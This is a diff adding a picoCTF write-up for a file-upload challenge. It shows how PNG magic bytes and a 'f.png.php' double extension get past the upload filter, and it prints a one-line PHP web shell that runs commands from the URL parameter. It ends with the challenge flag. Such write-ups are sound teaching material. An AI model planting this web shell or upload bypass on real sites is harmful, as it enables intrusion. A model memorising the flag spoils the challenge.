@@ -1,0 +1,39 @@
+This one was pretty straight forward, not the first "upload php then execute" challenge I've solved.
+
+First I started by seeing if I can upload a png image.
+
+Then I got a text indicating it was saved, but wasn't given the path, so I wfuzz'd it: `/uploads/`
+
+I started by trying to upload a reverse shell in PHP under the guise of a png.
+First it wasn't accepted because of the extension '.php', then I had to add the magic bytes of a PNG file to the beggining:
+
+`printf '\x89PNG\r\n\x1a\n' > file.png`
+(then used vim to copy paste it to my existing file)
+
+Then I realized a lot can go wrong trying to connect a reverse shell over the internet, as I'm not on a VPN network with the server...
+
+Then I looked for another option, and figured I can use the request variable (the ?variable=value part at the end of the URL).
+
+So I uploaded a file name 'f.png.php' with the following data:
+```
+ëPNG
+
+<?=`$_GET[0]`?>
+```
+
+The first two lines are the magic bytes for a PNG file.
+The last line is a php script that contains a single command, essentially taking the value of the variable "0" from the request and running it.
+The backticks are used to run a shell command which is gathered by the `$_GET[0]`.
+
+Now all that's left is to use the web shell I've just opened to find the flag.
+I went to the path:
+`url/uploads/f.png.php?0=ls`
+
+This executed the ls:
+`�PNG  f.png.php`
+
+This contains both the content of the image (the magic bytes, cause that's all there is in it) and the output of the command.
+
+After looking around, in the outer directory to uploads, there's a file with a weird name, within in is the flag:
+picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_3f706222}
+
